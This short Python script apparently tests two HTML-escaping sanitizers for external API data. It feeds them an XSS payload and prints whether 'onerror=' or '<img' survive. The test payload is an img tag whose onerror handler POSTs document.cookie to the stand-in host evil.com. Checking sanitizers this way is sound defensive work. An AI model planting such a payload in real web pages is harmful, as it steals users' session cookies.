#!/usr/bin/env python3

import html
import json

def _sanitize_external_api_data(data):
    if data is None:
        return ''
    if isinstance(data, str):
        return html.escape(data)
    if isinstance(data, (int, float, bool)):
        return html.escape(str(data))
    if isinstance(data, dict):
        return {key: _sanitize_external_api_data(value) for key, value in data.items()}
    if isinstance(data, list):
        return [_sanitize_external_api_data(item) for item in data]
    return html.escape(str(data))

def _deep_html_escape_json_data(data):
    if isinstance(data, str):
        return html.escape(data)
    if isinstance(data, list):
        return [_deep_html_escape_json_data(item) for item in data]
    if isinstance(data, dict):
        return {key: _deep_html_escape_json_data(value) for key, value in data.items()}
    return data

test_payload = '<img src=x onerror="fetch(\'http://evil.com\', {method:\'POST\', body:JSON.stringify(document.cookie)})">'

print(f"Original: {test_payload}")

step1 = _sanitize_external_api_data(test_payload)
print(f"After _sanitize_external_api_data: {step1}")

step2 = _deep_html_escape_json_data(step1)
print(f"After _deep_html_escape_json_data: {step2}")

final_json = json.dumps(step2)
print(f"Final JSON: {final_json}")

print(f"\nContains 'onerror=': {'onerror=' in final_json}")
print(f"Contains '<img': {'<img' in final_json}")
print(f"Contains '&lt;img': {'&lt;img' in final_json}")
print(f"Contains '&quot;': {'&quot;' in final_json}")